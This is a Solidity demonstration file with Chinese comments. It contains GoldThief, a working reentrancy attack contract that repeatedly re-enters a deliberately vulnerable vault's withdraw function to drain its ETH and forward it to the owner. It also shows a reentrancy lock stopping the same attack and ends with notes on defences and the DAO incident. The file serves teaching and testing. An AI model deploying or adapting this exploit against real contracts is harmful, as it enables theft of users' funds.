// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// IVault - 金库接口
// 定义了 GoldVault 合约的功能接口
interface IVault {
    function deposit() external payable;      // 存款
    function vulnerableWithdraw() external;   // 有漏洞的提款（用于演示重入攻击）
    function safeWithdraw() external;         // 安全的提款（有重入保护）
}

// GoldThief - 重入攻击演示合约
// 这是一个恶意合约，用于演示和测试重入攻击（Reentrancy Attack）
// 展示了有漏洞的合约如何被攻击，以及防护措施如何阻止攻击
contract GoldThief {
    IVault public targetVault;    // 目标金库合约
    address public owner;         // 攻击者地址（合约所有者）
    uint public attackCount;      // 攻击计数器（记录重入次数）
    bool public attackingSafe;    // 是否正在攻击安全版本

    // 构造函数 - 设置目标金库
    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    // 攻击有漏洞的金库
    // 演示重入攻击如何窃取资金
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        // 重置攻击状态
        attackingSafe = false;
        attackCount = 0;

        // 步骤 1: 向目标合约存款
        targetVault.deposit{value: msg.value}();

        // 步骤 2: 调用有漏洞的提款函数
        // 这会触发 receive() 函数，开始重入攻击
        targetVault.vulnerableWithdraw();
    }

    // 攻击有防护的金库
    // 演示重入防护如何阻止攻击
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        // 重置攻击状态
        attackingSafe = true;
        attackCount = 0;

        // 步骤 1: 向目标合约存款
        targetVault.deposit{value: msg.value}();

        // 步骤 2: 尝试调用安全的提款函数
        // 这会因重入锁而失败
        targetVault.safeWithdraw();
    }

    // 接收函数 - 重入攻击的核心
    // 当目标合约发送 ETH 时会触发此函数
    receive() external payable {
        attackCount++;

        // 攻击有漏洞的版本:
        // 如果金库余额充足且攻击次数未达上限，继续重入
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();  // 递归调用，重复提款
        }

        // 攻击安全版本:
        // 尝试重入，但会因 nonReentrant 修饰符而失败
        if (attackingSafe) {
            targetVault.safeWithdraw();  // 这将失败，因为重入锁已激活
        }
    }

    // 提取窃取的 ETH
    // 攻击者调用此函数取回窃取的 ETH
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");

        // 修改说明: 原代码使用 transfer()，但 Solidity 0.8.19+ 已弃用 transfer()
        // 原因: transfer() 固定只转发 2300 gas，如果接收方合约需要更多 gas 会失败
        // 新代码使用 call{value: amount}("")，更灵活且兼容性好
        // 注意: call 不会自动回滚，需要手动检查返回值
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    // 获取合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 重入攻击原理说明:
//
// 1. 漏洞根源:
//    - 目标合约先发送 ETH，后更新余额
//    - 攻击者在接收 ETH 时回调目标合约
//    - 余额尚未更新，攻击者可以再次提款
//
// 2. 攻击流程:
//    - 攻击者存入 1 ETH
//    - 调用 withdraw，合约发送 ETH
//    - 攻击者的 receive() 被触发
//    - receive() 再次调用 withdraw
//    - 重复直到资金耗尽或 gas 耗尽
//
// 3. 防护措施:
//    - Checks-Effects-Interactions 模式
//    - 重入锁（Reentrancy Guard）
//    - 先更新状态，后发送 ETH
//
// 4. 实际案例:
//    - 2016 年 The DAO 攻击，损失 360 万 ETH
//    - 重入攻击是最常见的智能合约漏洞之一
